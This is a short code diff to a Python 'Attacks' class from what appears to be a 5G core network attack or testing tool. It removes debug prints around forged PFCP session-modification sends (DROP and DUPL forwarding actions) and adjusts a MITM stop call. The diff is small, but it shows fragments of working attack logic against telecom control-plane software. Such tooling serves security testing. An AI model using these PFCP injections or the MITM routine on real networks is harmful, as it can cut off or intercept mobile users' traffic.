@@ -59,7 +59,7 @@ class Attacks():
         print(f"-- Sleeping for {time_to_sleep} seconds during MITM")
         time.sleep(time_to_sleep)
         
-        stop = CNMitm.stop(nf_type)
+        stop = CNMitm.stop()
         print(f"-- MITM stopped: {stop}")
         
         return start and stop
@@ -144,7 +144,6 @@ class Attacks():
         ue_addr = PFCPRequest.random_ue_address()
         far_id  = random.randint(1, 1000)
         
-        print(f"Sending session modification with DROP: seid={seid}, teid={teid}, ue_addr={ue_addr}, far_id={far_id}")
         send(
             PFCPRequest.session_modification(
                 src_addr=get_my_ip_from_prefix(),
@@ -170,7 +169,6 @@ class Attacks():
         ue_addr = PFCPRequest.random_ue_address()
         far_id  = random.randint(1, 1000)
         
-        print(f"Sending session modification with DUPL: seid={seid}, teid={teid}, ue_addr={ue_addr}, far_id={far_id}")
         send(
             PFCPRequest.session_modification(
                 src_addr=get_my_ip_from_prefix(),
@@ -203,7 +201,6 @@ class Attacks():
             ue_addr = PFCPRequest.random_ue_address()
             far_id  = random.randint(1, 1000)
             
-            print(f"Sending session modification: seid={seid}, teid={teid}, ue_addr={ue_addr}, far_id={far_id}")
             send(
                 PFCPRequest.session_modification(
                     src_addr=get_my_ip_from_prefix(),
